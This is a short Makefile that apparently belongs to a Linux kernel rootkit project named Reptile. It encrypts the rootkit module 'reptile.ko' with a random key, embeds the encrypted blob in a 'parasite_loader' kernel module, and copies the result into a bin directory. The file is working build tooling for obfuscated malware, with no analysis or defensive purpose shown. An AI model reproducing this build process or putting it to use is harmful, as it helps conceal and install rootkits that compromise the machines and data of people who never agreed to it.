PARASITE ?= ../reptile.ko

all: encode
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD
	cp parasite_loader.ko ../bin/reptile

encode:
	$(MAKE) -C encrypt
	encrypt/encrypt $(PARASITE) \
		0x$(shell openssl rand -hex 4) > parasite_blob.inc

clean:
	$(MAKE) -C encrypt clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$$PWD clean
	rm -f parasite_blob.inc
